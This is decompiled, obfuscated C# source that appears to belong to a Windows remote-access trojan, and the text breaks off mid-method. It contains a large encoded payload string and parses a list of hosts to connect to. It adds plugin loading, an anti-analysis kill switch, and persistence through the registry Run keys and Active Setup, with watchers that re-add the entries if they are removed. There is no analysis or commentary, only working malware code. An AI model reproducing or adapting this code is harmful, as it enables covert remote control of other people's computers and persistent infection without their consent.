using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Plugin;

namespace ns0;

internal class Class4
{
	private const string string_0 = "eYa8LC8sLCwwLCwsKyssLOQsLCwsLCwsbCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsrCwsLDpL5jos4DX5TeQtePlNgJSVn0ycnpuTno2ZTI+NmpqboEyOkUyeoZpMlZpMcHt/TJmbkJFaOTk2UCwsLCwsLCx8cSwseC0vLGf6uHosLCwsLCwsLAwsLk03LTQsLEgsLCwyLCwsLCwsumYsLCxMLCwsbCwsLCxsLCxMLCwsLiwsMCwsLCwsLCwwLCwsLCwsLCysLCwsLiwsLCwsLC8sbLEsLDwsLDwsLCwsPCwsPCwsLCwsLDwsLCwsLCwsLCwsLGxmLCx3LCwsLGwsLKwvLCwsLCwsLCwsLCwsLCwsLCwsLIwsLDgsLCzUZSwsSCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsTCwsNCwsLCwsLCwsLCwsNEwsLHQsLCwsLCwsLCwsLFqgkaSgLCwswEYsLCxMLCwsSCwsLC4sLCwsLCwsLCwsLCwsLEwsLIxanp+ejywsLKwvLCwsbCwsLDAsLCxKLCwsLCwsLCwsLCwsLCxsLCxsWp6RmJuPLCw4LCwsLIwsLCwuLCwsTiwsLCwsLCwsLCwsLCwsbCwsbiwsLCwsLCwsLCwsLCwsLCycZiwsLCwsLHQsLCwuLDEs1FEsLCxALCwtLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLIIuVD0sLDYsLC6fPiwsNqk1LCwwLFYsLD9cLyyFLCwsLSwsPSyfPywsNqw3LCwwn0AsLDasNiwsMKo2LCwwqjcsLDAum0EsLDYsqjcsLDCbQiwsNiyqNywsMJtDLCw2Nqo3LCwwm0QsLDYsQKw3LCwwQKw2LCwwMjdXLDNWLCwsP1wuLH8sLCwuLCw9LC6fRSwsNqw3LCwwn0AsLDasNiwsMKo2LCwwqjcsLDCbRiwsNqEzLCwuNqo3LCwwm0IsLDYsqjcsLDCbRCwsNixArDcsLDBArDYsLDAyN1csM1ZKLlQ9LCw2Viw/XC0sNywsLC8sLD0upz4sLDA2VywyVk4uL6k+LCwwVj9cLSw3LCwsMCwsPS6nPywsMDZXLDJWTi4vqT8sLDBWP1wvLHYsLCwxLCw9LC5USCwsNlRJLCw2/EIsLC1USiwsNkObSywsNjYyupVCKi5CKi04NFlCLDJCxqBCLCwtm0wsLDafTSwsNjdXNKpOLCw2N1csM1Y2LFYsLCw/XC8sXCwsLDIsLD0upzgsLDA2MjczL1RPLCw2oDgsLC04Lqg4LCwwNDNULSwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDIsLD0upzgsLDA2MjczL1RRLCw2oDgsLC04Lqg4LCwwNDNULSwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDIsLD0upzksLDA2MjczL1RPLCw2oDgsLC04Lqg5LCwwNDNULSwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDIsLD0upzksLDA2MjczL1RRLCw2oDgsLC04Lqg5LCwwNDNULSwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDIsLD0upzosLDA2MjczL1RPLCw2oDgsLC04Lqg6LCwwNDNULSwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDIsLD0upzosLDA2MjczL1RRLCw2oDgsLC04Lqg6LCwwNDNULSwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDMsLD0upzssLDA2MjczL1RPLCw2oC8sLC44Lqg7LCwwNDNULiwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDMsLD0upzssLDA2MjczL1RRLCw2oC8sLC44Lqg7LCwwNDNULiwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDQsLD0upzwsLDA2MjczL1RPLCw2oC4sLC44Lqg8LCwwNDNULywsVzYyMyotQiotOTVZBFY/XC8sXCwsLDQsLD0upzwsLDA2MjczL1RRLCw2oC4sLC44Lqg8LCwwNDNULywsVzYyMyotQiotOTVZBFY/XC8sXCwsLDUsLD0upz0sLDA2MjczL1RPLCw2oDAsLC44Lqg9LCwwNDNUMCwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDUsLD0upz0sLDA2MjczL1RRLCw2oDAsLC44Lqg9LCwwNDNUMCwsVzYyMyotQiotOTVZBFY/XC8scCwsLDYsLD0sLzYyQlouV0kupzssLDBAKi03M1k6Lqc7LCwwLjCbMiwsMixXSS6nPCwsMEAqLTczWToupzwsLDAuMJsuLCwyLFcsVj9cLyxJLCwsNywsPSwupz0sLDBAKi02Mlk6Lqc9LCwwLi+bNiwsMixWLCwsP1wvLEksLCw3LCw9LC6nOCwsMEAqLTYyWToupzgsLDAuQJtSLCw2LFYsLCwvXC8sdCwsLCwsLCwsLqc4LCwwQECbUiwsNiwupzksLDBAQJtSLCw2LC6nOiwsMEBAm1IsLDYsLqc8LCwwQECbLiwsMiwupz0sLDBAQJs2LCwyLFZKLlQ9LCw2Vm5/dm4tLC0sLCwsLDgsLCyiXlpcWmFcY15jLCwsLDEsmCwsLDA1LCxPqiwsnDUsLAwzLCxPf6CelZqTnywsLCx8PSwsNCwsLE+BfyyEPSwsPCwsLE9zgXVwLCwslD0sLMQuLCxPbpibjiwsLCwsLCwuLCwtg0niNTU0LCwsJlFfLEIsLC0sLCxRLCwsNSwsLD8sLCxeLCwsXSwsLFIsLCwwLCwsPywsLDcsLCwtLCwsMiwsLC0sLCw4LCwsRiwsLC0sLCwtLCwsLiwsLDAsLCwsLDYsLSwsLCwsMizCLLssMizULLssMizZLLssMiztLLssMiz6LLssMixILbssMixzLVgtMiyuLX8tMizLLcEtMiyILrssNiyxLpwuMiwFLrssMiwjMBEwMiw6MREwMixXMREwMix2MREwMiyPMREwMiyoMREwMizDMREwMizeMREwMiwWMfcxMiwqMfcxMiw4MhEwMixRMhEwMiyBMm4ykyyVMiwsMizEMqQyMizkMqQyMiwCMrssMiwYMsEtMiw1M6QyMixQM7ssMixdMxEwMixyM7ssMiy6M7ssMizcM8szMiz/M7ssLCwsLC0sLCwsLC0sLSwtLSwsQixVLDEsLSwtLC0tLCxcLFUsMSwtLDEsLS0sLG4sVSwxLC0sNSwtLSwsgyxVLDUsLSw5LC0tLCyPLFUsNSwwLDksLUw8LJQsVSw5LDMsOSwtLDwsnyxVLDksNiw6LK0sPCyqLFUsOSw4LD0sMjIeLFYsgqwmLFksgqwrLFksMjIeLFYsgqwzLWcsgqw6LWcsMixBLWssMixNLW4sMix6LXIsPSy+LX0sPSzYLYEsLSwSLsosLSxTL8osLSx2L8osLSyZL9QsLSy2L94sLSzWL+gsLSwXL/osLSw6MP4sLCwsLC8sskTgLDYsLSwsLCwsLyzyLeYsPCwvLCwsLCwvLPItCCxELDEsLCwsLC8s8i0ULFAsNSwsLCwsLyyyROAsNiw2LCwsLCwvLPIt5iw8LDgsLCwsLC8s8i0ILEQsOiwsLCwsLyzyLRQsUCw+LCwsLCwvLLJE4Cw2LD8sLCwsLC8s8i3mLDwsQSwsLCwsLyzyLQgsRCxDLCwsLCwvLPItFCxQLEcsfEwsLCwsskTgLHksSCyUTCwsLCzCLNsthSxILPxMLCwsLMIs5S2MLEksW00sLCwsskTgLHksSiwsLCwsLCzyOfEtkyxKLCwsLCwsLPI5+i2TLEosLCwsLCws8jkKLZMsSiwsLCwsLCzyORUtlyxKLCwsLCwsLPI5Ji2cLEosLCwsLCws8jk+LpwsSiwsLCwsLCzyOVAunCxKLGRNLCwsLLI0XC6gLEose00sLCwssjRyLqUsSiwsLCwsLCzyOZAuqyxLLCwsLCwsLPI5ti6wLEsshE0sLCwssjTELrUsSyybTSwsLCyyNNQuuSxLLKRNLCwsLLI05C6+LEwsLCwsLCws8jHtLnksTCwsLCwsLCzyMfguwyxMLPpNLCwsLPItAC65LE4sAE0sLCwssjQkLs4sTyw8TiwsLCyyNDovzixQLHhOLCwsLLI0Wy/OLFEstE4sLCwssjRnL84sUizwTiwsLCyyNH4vzixTLCxPLCwsLLI0ii/OLFQsaE8sLCwssjSfL9gsVSykTywsLCyyNKkv2CxWLOBPLCwsLLI0vS/iLFcsHE8sLCwssjTIL+IsWCxYUCwsLCyyNN8v7CxZLJRQLCwsLLI07C/sLFos0FAsLCwssiz8L/IsWywgUCwsLCyyLAEvpSxdLExRLCwsLLIsDC95LF4seFEsLCwsrSwVL3ksXizMUSwsLCywROAseSxeLCwsLSzOMCwsLizVMCwsLSzcMCwsLiwVLywsLSzcMCwsLiwVLywsLyzjMCwsMCzOMCwsLSzsMCwsLSzOMCwsLizVMCwsLSzcMCwsLiwVLywsLSzcMCwsLiwVLywsLyzjMCwsMCzOMCwsLSzsMCwsLSzOMCwsLizVMCwsLSzcMCwsLiwVLywsLSzcMCwsLiwVLywsLyzjMCwsMCzOMCwsLSzsMCwsLSzzMCwsLSz4MCwsLSz6MCwsLSz6MCwsLSwAMCwsLiwVLywsLSwAMCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSwMMCwsLiwVLywsLSwVL5Us4CwmLJ0s4CwmLKUs4CwmLK0s4CwmLLUs4CwmLL0s4CwmLMUs4CwmLM0s4CwmLNUs4CwrLN0s4CwmLOUs4CwmLO0s4CwmLPUs4CwwLQUs4Cw2LQ0s4Cx5LBUs4Cx5LEUs4Cx5LDgs4Cx5LHUs4Cx5LG0s4Cx5LG0s2y1BLR0sHzJ5LHUsJTJILR0sLTN5LHUs4CxULW0s5S1aLSUs4Cx5LEUsVTNwLTUtZjN2LS0thDN/LTUtljOILd0sqjOTLF0s4CwmLF0stDNuLEUtwzOZLU0t6DOlLUUt+DOZLY0s5iz4LTQsNCxdLDQsOCxiLDQsQCxdLDQsRCxiLFosTywtLlospyyiLlosXyw6LlosnyyZLlosNywALVosPywMLVosRywnLVosVywALVosZywnLVosdywnLVosfyxZLlosjyyDLloslyyQLm0uByxiLI0uByxiLCwvByxiLEwvByxiLKwvByxiLMwvByxiLE0tYC1nLWwtkS23LcYt1S3kLe4t9C01LC0sLCwSLl0sLCxTL10sLCx2L10sLCyZLzgsLCy2LzQsLCzWLzwsNSwtLCwsVzABLCwsXDABLCwsaDABLCwsbzAFLCwsfDAKLCwskDAKLCwsnjAKLCwspjAOLCwsiC4TLCwsuDAYLCwswjAdLCwsSC0hLDwsTywuLDQsTiwuLC4sPSwvLDwsUSwwLDQsUCwwLC4sPiwxLDQsUiwyLDwsUywyLC4sPywzLDwsVSw0LDQsVCw0LC4sQCw1LDwsVyw2LDQsViw2LC4sQSw3LDwsWSw4LDQsWCw4LC4sQiw5LC4sQyw7LC4sRCw9LC0sRSw9LC4sRiw/LC4sRyxBLC0sSSxDLC4sSCxDLC4sSixFLDstMKwsLC0sLCwsLCwsLCwsLCwsqiwsLC4sLCwsLCwsLCwsLC0ssiwsLCwsLiwsLCwsLCwsLCwsLSycLiwsLCx1LLItdSzBLXUs0C11LN8tLCwsaHmbkKGYkWosdXyYoZOVmlqQmJgse6GgnKGgcaKRmqB0jZqQmJGeLHyYoZOVmix1mpyhoHGikZqgdI2akJiRnix+kY+RlaKRkHGikZqgdI2akJiRnix8mKGTlZp/oI2gkSx/lZCRLHyYoZOVmm2ek58sf5GelY2YlaaRnix1fJihk5WaLJmfj5uemJWOLH+ln6CRmSx5oZiglY+Nn6BwkZiRk42gkSxxmqGZLHuOlpGPoCxaj6Cbnix1mqKbl5EsdW2fpZqPfpGfoZigLG2fpZqPb42YmI6Nj5csbpGTlZp1mqKbl5EsLE4W83GakHWaopuXkSyijZihkYuLLHp7enEsfoF6enV6cyxveHVxeoAsf3F+gnF+LHSRjZCRnixzoZWQLHyYoZOVmnOhlZAsf6WfoJGZWm+bmJiRj6CVm5qfWnORmpGelY8seJWfoIxdLHCNoI0sf6WfoJGZWn6hmqCVmZFaf5GelY2YlaaNoJWbmlpym56ZjaCgkZ6fWm6Vmo2epSxulZqNnqVym56ZjaCgkZ4sjpIsf6WfoJGZWnV7LHmRmZuepX+gnpGNmSyZnyx/kZ6VjZiVppEscJGfkZ6VjZiVppEsk5Ggi3qNmZEsk5Ggi3CRn4+elZyglZuaLJORoIttoaCUm54sk5Ggi2+hnp6RmqB/oI2gkSyTkaCLf6CbnHuacJWfj5uampGPoJWbmiyTkaCLcaSRj6GgkXuaeJuNkCyTkaCLdI2fcpuemSyTkaCLcaSRj6GgkXuaeJuNkG2ek58sn5Ggi3GkkY+hoJF7mnibjZBtnpOfLIKRnp+Vm5osk5Ggi4KRnp+Vm5osf6WfoJGZWoOVmpCbo59acpuemZ8scpuemSyTkaCLdZqcoaBym56ZLJORoIt/oI2gkXuOlpGPoCyfkaCLf6CNoJF7jpaRj6Ask5Ggi3OhlZAsdZqVoJWNmJWmkSxxpJGPoaCRLH+gm5wscaKRmqB0jZqQmJGeLHGkkY+hoJWbmm+bmZyYkaCRLI2QkItxpJGPoaCVm5pvm5mcmJGgkSyekZmbopGLcaSRj6GglZuab5uZnJiRoJEsf6CNnqCRkCyNkJCLf6CNnqCRkCyekZmbopGLf6CNnqCRkCx/oJucnJGQLI2QkIt/oJucnJGQLJ6RmZuikYt/oJucnJGQLHWanKGgLI2QkIt1mpyhoCyekZmbopGLdZqcoaAse6GgnKGgLI2QkIt7oaCcoaAsnpGZm6KRi3uhoJyhoCx+kY+RlaKRkCyNkJCLfpGPkZWikZAsnpGZm6KRi36Rj5GVopGQLH+RmpAse5p+kY+RlaKRkCxxpJGPoaCRkCyRLGhxpJGPoaCRe5p4m42QbZ6Tn2qXi4tujY+XlZqTcpWRmJAsaH+gjaCRe46WkY+gapeLi26Nj5eVmpNylZGYkCx6jZmRLHCRn4+elZyglZuaLG2hoJSbnixvoZ6ekZqgf6CNoJEsf6CbnHuacJWfj5uampGPoJWbmixxpJGPoaCRe5p4m42QLHSNn3KbnpkscaSRj6GgkXuaeJuNkG2ek58sdZqcoaBym56ZLH+gjaCRe46WkY+gLJuOlpGPoCyZkaCUm5Asn5GakJGeLI+NmJiOjY+XLJ6Rn6GYoCyNnpOfLI4soo2YoZEsn6CNoJF7jpaRj6Asn5WQkSx/pZ+gkZlafpGSmJGPoJWbmixtn5+RmY6YpYCVoJiRbaCgnpWOoaCRLG2fn5GZjpilcJGfj56VnKCVm5ptoKCelY6hoJEsbZ+fkZmOmKVvm5qSlZOhno2glZuabaCgnpWOoaCRLG2fn5GZjpilb5uZnI2apW2goJ6VjqGgkSxtn5+RmY6YpXyem5Chj6BtoKCelY6hoJEsbZ+fkZmOmKVvm5ylnpWTlKBtoKCelY6hoJEsbZ+fkZmOmKWAno2QkZmNnpdtoKCelY6hoJEsbZ+fkZmOmKVvoZigoZ6RbaCgnpWOoaCRLH+ln6CRmVp+oZqglZmRWnWaoJGem5x/kZ6ilY+Rnyxvm5mClZ+VjpiRbaCgnpWOoaCRLHOhlZBtoKCelY6hoJEsbZ+fkZmOmKWCkZ6flZuabaCgnpWOoaCRLG2fn5GZjpilcpWYkYKRnp+Vm5ptoKCelY6hoJEsf6WfoJGZWnCVjZOam5+glY+fLHCRjqGTk42OmJFtoKCelY6hoJEscJGOoZOTlZqTeZuQkZ8sf6WfoJGZWn6hmqCVmZFab5uZnJWYkZ5/kZ6ilY+Rnyxvm5mclZiNoJWbmn6RmI2kjaCVm5qfbaCgnpWOoaCRLH6hmqCVmZFvm5mcjaCVjpWYlaClbaCgnpWOoaCRLH+RnpWNmJWmjY6YkW2goJ6VjqGgkSx/oJ6RjZksb5ibn5EsgJttnp6NpSxwlZ+cm5+RLG+bmZyVmJGec5GakZ6NoJGQbaCgnpWOoaCRLIClnJEsc5GggKWckSxtn5+RmY6YpSxzkaBtn5+RmY6YpSx+oZqglZmRgKWckXSNmpCYkSxzkaCApZyRcp6bmXSNmpCYkSxzkaBvoZ+gm5ltoKCelY6hoJGfLJORoIuCjZihkSxxmZygpSxwkZiRk42gkSxvm5mOlZqRLH+ln6CRmVqAlJ6RjZCVmpMsdZqgkZ6Ym4+XkZAsb5uZnI2ekXGkj5SNmpORLH6RmZuikSxxopGaoG2ek58sLCwsLC9MLCwsLCwASdsQevzWbcRL11CUWWJuLDTjpoiCRWAMtTFMLi1IRDNMLi0+UD5IN0wwPj0+UD5IPkFIMUwtLT49LjI0LzI9QDAsLCwsMC0sLCwvMj1ELjI6LzI9RTIyQT5JLUgvTCwtLzI+TS8yPlEyLC1JMT5IMiwtPkhJMS9MLDowTCw9QC9MLC4wTCw+SDFMLS0+SDBMLD5VMEwsPlkvTCxIMEwtLUgwTCw9RTJMLi1IPkgvMj5dMUwtLT5dLzI+ODFMLS0+OC8yPjQxTC0tPjQvMj48MUwtLT48M0wuLT1EPkgvMj5ILjJIL1QsOjBULD1AL1QsLjBULD5IMFQsPlUwVCw+WS9ULEgwVCw9RTBMLS06MEwtLS4xTC0tPZUwTC0tNDFBPkktSDJMLi0+pUgwTCxJMTIzLkkxSTExTC0tSTExTC1IPqUyMy4+SD5IMDMtPkgvMy1IMUwsPqytNCwtPqyxPqytNCwtPqytPay1NEwuSUg+rK0uMzMvSUg9RS43LC4+rLk+rLk+rLk4PC0vSiw8SixKLEosMDYtPl01MzA+XT5dPl0uMDYtPjg1MzA+OD44PjguMDYtPjQ1MzA+ND40PjQuMDYtPjw1MzA+PD48PjwuMTMuPUQuLzMtLjNMLi1IPqzBNy0sMnyYoZOVmiwsRi0sQXqRoFmDkY2ikUx8mKGTlZpMbo2fkSwsMS0sLCwsOC0sM6R/lZiRmqAsLEotLEVvm5ylnpWTlKBM7tVMpH+VmJGaoExeXF1dLCxVLSxQY19ijWCRXGFZj45lkVlgjmGSWWWQkGFZXo2PYmWRko9ckGVlLCw4LSwzXVpcWlxaXCwsNC0sMy0sLCwsNC0sNCwsLCwsSi0sLSyALkKDno2cepuacaSPkZyglZuagJSem6OfLSwsLCwsLCxn+rh6LCwsLC4sLCymLCws8GUsLPBHLCx+f3B/nKO06iaYLHmv4Dk3kFaf3S4sLCxvZoiBn5Gen4h6jaCUjZqIcJuPoZmRmqCfiIKVn6GNmEx/oKGQlZtMXlxdXIh8npuWkY+gn4h8npuWkY+gTHBwm3+Rnoh8mKGTlZqIm46WiHCRjqGTiHV8mKGTlZpanJCOLCwslGYsLCwsLCwsLCwsqmYsLCxMLCwsLCwsLCwsLCwsLCwsLCwsLCwsLJxmLCwsLCwsLCyLb5uecJiYeY2VmiyZn4+bnpGRWpCYmCwsLCwsK1EsTGwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLSw8LCwsRCwsrCwsLCwsLCwsLCwsLCwsLSwtLCwsXCwsrCwsLCwsLCwsLCwsLCwsLSwsLCwsdCwsLIRsLCxQLywsLCwsLCwsLCxQL2AsLCyCLH8siyyCLHEsfix/LHUseyx6LIssdSx6LHIseywsLCws6TAbKiwsLSwsLC0sLCwsLCwsLSwsLCwsaywsLCwsLCwwLCwsLiwsLCwsLCwsLCwsLCwsLHAsLCwtLIIsjSyeLHIslSyYLJEsdSyaLJIsmywsLCwsUCwwLCwsgCyeLI0smiyfLJgsjSygLJUsmyyaLCwsLCwsLNwwsC4sLC0sfyygLJ4slSyaLJMsciyVLJgskSx1LJoskiybLCwsjC4sLC0sXCxcLFwsXCxcLGAsjixcLCwscCxCLC0sbyybLJksmSyRLJosoCyfLCwseiyRLKAsWSyDLJEsjSyiLJEsTCx8LJgsoSyTLJUsmixMLG4sjSyfLJEsLCxcLDQsLSxvLJssmSycLI0smiylLHosjSyZLJEsLCwsLKQsfyyVLJgskSyaLKAsLCxkLDMsLSxyLJUsmCyRLHAskSyfLI8sniyVLJwsoCyVLJssmiwsLCwsfCyYLKEskyyVLJosLCwsLFwsNCwtLHIslSyYLJEsgiyRLJ4snyyVLJssmiwsLCwsXSxaLFwsWixcLFosXCwsLGQsOCwtLHUsmiygLJEsniyaLI0smCx6LI0smSyRLCwsdSx8LJgsoSyTLJUsmixaLJAsmCyYLCwshCxFLC0seCyRLJMsjSyYLG8smyycLKUsniyVLJMslCygLCwsbyybLJwspSyeLJUskyyULKAsTCzVLEwspCx/LJUsmCyRLJosoCxMLF4sXCxdLF0sLCwsLGwsOCwtLHssniyVLJMslSyaLI0smCxyLJUsmCyRLJosjSyZLJEsLCx1LHwsmCyhLJMslSyaLFoskCyYLJgsLCxcLDMsLSx8LJ4smyyQLKEsjyygLHosjSyZLJEsLCwsLHwsmCyhLJMslSyaLCwsLCxgLDQsLSx8LJ4smyyQLKEsjyygLIIskSyeLJ8slSybLJosLCxdLFosXCxaLFwsWixcLCwsZCw0LC0sbSyfLJ8skSyZLI4smCylLEwsgiyRLJ4snyyVLJssmiwsLF0sWixcLFosXCxaLFwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsXCwsOCwsLLxmLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLA==";

	private static List<GClass0> list_0;

	private static List<Class6> list_1;

	private static bool bool_0;

	private static bool bool_1;

	private static int int_0;

	[MTAThread]
	private static int Main()
	{
		if (Class2.bool_13 && (!Class2.bool_0 || !(Process.GetCurrentProcess().MainModule!.FileName == Path.Combine(Class2.string_1, Class12.smethod_3(Class2.string_2, bool_0: true)))))
		{
			Class13.smethod_0();
		}
		smethod_0();
		smethod_1();
		try
		{
			while (true)
			{
				string text = Console.ReadLine();
				if (text.ToLower() == "clear")
				{
					Console.Clear();
				}
			}
		}
		catch
		{
		}
		Process.GetCurrentProcess().WaitForExit();
		return 0;
	}

	private static void smethod_0()
	{
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Expected O, but got Unknown
		bool_0 = false;
		bool_1 = false;
		AppDomain.CurrentDomain.AssemblyResolve += smethod_6;
		Class1.smethod_0(Class2.string_6);
		if (Class1.Boolean_0)
		{
			Process.GetCurrentProcess().Kill();
			return;
		}
		string[] array = Class12.smethod_3(Class2.string_0, bool_0: true).Split(new char[1] { '|' });
		list_1 = new List<Class6>();
		for (int i = 0; i < array.Length; i++)
		{
			if (!string.IsNullOrEmpty(array[i]))
			{
				Class6 @class = new Class6(array[i].Split(new char[1] { '>' })[0], int.Parse(array[i].Split(new char[1] { '>' })[1]), Class12.smethod_2(array[i].Split(new char[1] { '>' })[2].Trim(), bool_0: true));
				@class.Disconnected += smethod_10;
				@class.ConnectionAccepted += smethod_9;
				@class.Received += smethod_8;
				@class.Sent += smethod_11;
				list_1.Add(@class);
			}
		}
		GClass1.smethod_0();
		GClass2.PluginAdded += smethod_5;
		SystemEvents.add_SessionEnding(new SessionEndingEventHandler(smethod_4));
		if (Class2.bool_0 && Process.GetCurrentProcess().MainModule!.FileName != Path.Combine(Class2.string_1, Class12.smethod_3(Class2.string_2, bool_0: true)))
		{
			new Thread(Class9.smethod_0).Start();
		}
		if (Class2.bool_10 && Process.GetCurrentProcess().MainModule!.FileName != Path.Combine(Class2.string_1, Class12.smethod_3(Class2.string_2, bool_0: true)))
		{
			GClass1.smethod_3();
		}
		if (Class2.bool_0 && Process.GetCurrentProcess().MainModule!.FileName == Path.Combine(Class2.string_1, Class12.smethod_3(Class2.string_2, bool_0: true)))
		{
			GClass2.smethod_1();
		}
		else
		{
			GClass2.smethod_2();
		}
		if (Class2.bool_0)
		{
			list_0 = new List<GClass0>();
			GClass0 gClass = new GClass0(Class2.registryHive_0, Class2.string_9);
			gClass.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
			gClass.RegChanged += smethod_2;
			if (Class2.bool_12)
			{
				if (Class2.bool_1)
				{
					GClass0 gClass2 = new GClass0(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					gClass2.RegChanged += smethod_3;
					gClass2.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass2);
				}
				if (Class2.bool_2)
				{
					GClass0 gClass3 = new GClass0(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					gClass3.RegChanged += smethod_3;
					gClass3.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass3);
				}
				if (Class2.bool_3)
				{
					GClass0 gClass4 = new GClass0(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Active Setup\\Installed Components");
					gClass4.RegChanged += smethod_3;
					gClass4.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass4);
				}
			}
		}
		Class2.string_11 = smethod_21(smethod_20() + "|" + Environment.UserName);
	}

	private static void smethod_1()
	{
		foreach (Class6 item in list_1)
		{
			item?.method_0();
		}
		if (list_0 != null)
		{
			foreach (GClass0 item2 in list_0)
			{
				item2.method_2();
			}
		}
		Class0.smethod_2();
		if (Class2.bool_4)
		{
			smethod_18();
		}
	}

	private static void smethod_2(object sender, EventArgs e)
	{
		ThreadStart start = GClass2.smethod_0;
		new Thread(start).Start();
	}

	private static void smethod_3(object sender, EventArgs e)
	{
		ThreadStart start = Class9.smethod_2;
		new Thread(start).Start();
	}

	private static void smethod_4(object sender, SessionEndingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_Reason() == 2 && Class2.bool_0)
		{
			Class9.smethod_0();
		}
	}

	private static void smethod_5(object object_0, IPlugin iplugin_0)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			iplugin_0.add_ExecutionComplete((EventHandler)smethod_15);
			iplugin_0.add_Output(new OutputEventHandler(smethod_14));
			iplugin_0.add_Started((EventHandler)smethod_13);
			iplugin_0.add_Stopped((EventHandler)smethod_12);
			GClass2.sortedList_1[iplugin_0.get_Guid()] = iplugin_0;
		}
		catch
		{
		}
	}

	private static Assembly smethod_6(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
